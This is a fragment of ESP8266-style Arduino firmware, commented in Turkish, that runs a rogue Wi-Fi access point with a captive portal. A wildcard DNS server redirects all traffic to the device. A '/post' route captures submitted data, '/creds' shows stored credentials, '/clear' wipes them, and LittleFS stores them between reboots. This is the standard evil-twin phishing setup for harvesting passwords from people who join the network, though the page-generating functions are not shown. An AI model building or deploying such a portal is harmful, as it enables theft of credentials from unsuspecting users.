// Kimlik bilgilerini temizleme ve temizlenmiş sayfasını döndürür
String clear() {
  credentialsData = "";
  savedData = false;
  deleteData();
  return String(casClearPage);
}

// LED blink işlemi; yeni veri alındığında geri bildirim sağlar
void BLINK() {
  for (int j = 0; j < 5; j++) {
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
  }
}

void setup() {
  bootTime = lastActivity = millis();
  Serial.begin(115200);
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);

  // LittleFS başlatma
  if (!LittleFS.begin()) {
    Serial.println("LittleFS mount failed");
    delay(1000);
    return;
  }
  // Her boot'ta kayıtlı veriyi okuyoruz
  readData();

  // WiFi AP modu ve captive portal ayarları
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255,255,255,0));
  WiFi.softAP(SSID_NAME);

  // Tüm DNS isteklerini captive portal IP'sine yönlendirmek için DNS sunucusunu başlatıyoruz
  dnsServer.start(DNS_PORT, "*", APIP);

  // Web sunucusu rotaları
  webServer.on("/post", [](){
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  webServer.on("/creds", [](){
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", [](){
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([](){
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });

  webServer.begin();
  Serial.println("Captive portal started.");
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); }
  dnsServer.processNextRequest();
  webServer.handleClient();
  i++;
  Serial.println(i);
  Serial.println(savedData);
  if (i == timer && savedData == true) {
    i = 0;
    digitalWrite(LED_BUILTIN, LOW);
    delay(50);
    digitalWrite(LED_BUILTIN, HIGH);
  }
  if (i > timer) { i = 0; }
}
